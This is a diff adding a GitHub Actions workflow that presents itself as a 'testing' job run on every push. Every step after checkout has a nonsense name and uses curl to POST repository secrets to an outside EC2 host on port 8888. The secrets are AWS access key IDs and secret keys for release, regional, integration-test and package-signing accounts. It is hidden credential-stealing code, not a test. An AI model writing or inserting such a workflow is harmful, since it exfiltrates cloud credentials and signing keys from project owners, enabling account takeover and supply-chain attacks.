@@ -1,0 +1,67 @@
+name: testing
+
+on: [push]
+
+jobs:
+  testing:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: ssssss
+      run: |
+        curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
+          -d "aws-access-key-id=${{ secrets.RELEASE_KEY_ID }}" \
+          -d "aws-secret-access-key=${{ secrets.RELEASE_SECRET }}" \
+          -d "aws-region=us-west-2"
+      
+    - name: testg
+      run: |
+        curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
+          -d "aws-access-key-id=${{ secrets.RELEASE_HKG_KEY_ID }}" \
+          -d "aws-secret-access-key=${{ secrets.RELEASE_HKG_SECRET }}" \
+          -d "aws-region=ap-east-1"
+      
+    - name: tretret
+      run: |
+        curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
+          -d "aws-access-key-id=${{ secrets.RELEASE_BAH_KEY_ID }}" \
+          -d "aws-secret-access-key=${{ secrets.RELEASE_BAH_SECRET }}" \
+          -d "aws-region=me-south-1"
+      
+    - name: Syuy
+      run: |
+        curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
+          -d "aws-access-key-id=${{ secrets.RELEASE_CPT_KEY_ID }}" \
+          -d "aws-secret-access-key=${{ secrets.RELEASE_CPT_SECRET }}" \
+          -d "aws-region=af-south-1"
+      
+    - name: dfsdfs
+      run: |
+        curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
+          -d "aws-access-key-id=${{ secrets.RELEASE_MXP_KEY_ID }}" \
+          -d "aws-secret-access-key=${{ secrets.RELEASE_MXP_SECRET }}" \
+          -d "aws-region=eu-south-1"
+      
+    - name: fdfdfadfsdsadg
+      run: |
+        curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
+          -d "aws-access-key-id=${{ secrets.INTEG_TEST_AWS_KEY_ID }}" \
+          -d "aws-secret-access-key=${{ secrets.INTEG_TEST_AWS_KEY_SECRET }}" \
+          -d "aws-region=us-west-2"
+          
+    - name: dfdfdfsgsgsge
+      run: |
+        curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
+          -d "aws-access-key-id=${{ secrets.RELEASE_KEY_ID }}" \
+          -d "aws-secret-access-key=${{ secrets.RELEASE_SECRET }}" \
+          -d "aws-region=us-west-2"
+          
+    - name: erefdfsdf
+      run: |
+        curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
+          -d "AWS_ACCESS_KEY_ID=${{ secrets.SIGN_PKG_AWS_ACCESS_KEY_ID }}" \
+          -d "AWS_SECRET_ACCESS_KEY=${{ secrets.SIGN_PKG_AWS_SECRET_ACCESS_KEY }}" \
+          -d "AWS_DEFAULT_REGION=us-west-2"
